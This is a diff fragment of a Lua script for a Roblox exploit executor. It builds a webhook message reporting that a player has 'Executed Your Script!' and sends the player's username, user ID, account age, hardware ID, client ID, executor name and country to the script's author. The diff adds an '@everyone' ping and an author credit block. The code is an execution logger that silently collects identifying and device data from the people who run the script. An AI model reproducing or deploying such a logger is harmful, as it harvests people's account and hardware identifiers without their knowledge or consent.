@@ -78,7 +78,7 @@ local requestwebhook = syn.request({
     Body = game:GetService("HttpService"):JSONEncode({
     ["username"] = "BxB.xyz | Webhook",
       ["avatar_url"] = "https://cdn.discordapp.com/attachments/1021789126388887593/1021789164003393577/Free_Sample_By_Wix_1.jpg",
-      --["content"] = "",
+      ["content"] = "@everyone ",
        ["embeds"] = {{
            ["title"] = "**"..game.Players.LocalPlayer.Name.." | Executed Your Script!**" ,  
            ["description"] = "",
@@ -96,7 +96,7 @@ local requestwebhook = syn.request({
 				                
 			{
                 ["name"] = "INFO PLAYER",
-                ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```Profile : ".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
+                ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```[Profile : ]".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
                 ["inline"] = CL
             }, 
             {
@@ -107,6 +107,11 @@ local requestwebhook = syn.request({
             {
                 ["name"] = "INFO EXECUTE",
                 ["value"] = "```Executor Name : "..EXE.."```".."```Hwid : "..a.."```".."```Client ID : "..ClientId.."```".."```Country : "..code.."```".."```Local ID : "..game.Players.LocalPlayer.LocaleId.."```",
+                ["inline"] = CL
+            },
+         {
+                ["name"] = "CREDIT",
+                ["value"] = "```Credit : B O O M#4134 \n         https://github.com/BxB-HUB```",
                 ["inline"] = CL
             },
             }
